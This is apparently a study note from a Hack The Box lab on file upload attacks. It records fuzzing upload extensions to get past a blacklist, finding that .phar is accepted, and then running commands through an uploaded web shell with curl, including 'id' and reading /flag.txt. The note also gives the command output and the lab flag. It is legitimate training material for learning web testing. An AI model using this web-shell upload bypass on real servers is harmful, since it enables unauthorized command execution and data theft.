---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
section: "Blacklist Filters"
source_file: "CWES.xmind"
---

# LAB

> [!info] Complete technical reference
> Imported without removing commands, hints, links, notes, or images.

## code

### use intruder to fuzz extensions

- copy Request as curl
- send GET
  - curl http://94.237.53.219:56681/profile_images/shell.php6
- use python script to automate upload then visiting to check which extensions worked
  - .phar worked
    - curl http://94.237.53.219:56681/profile_images/shell.phar?cmd=id
      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
        - curl http://94.237.53.219:56681/profile_images/shell.phar?cmd=cat+/flag.txt
          - HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
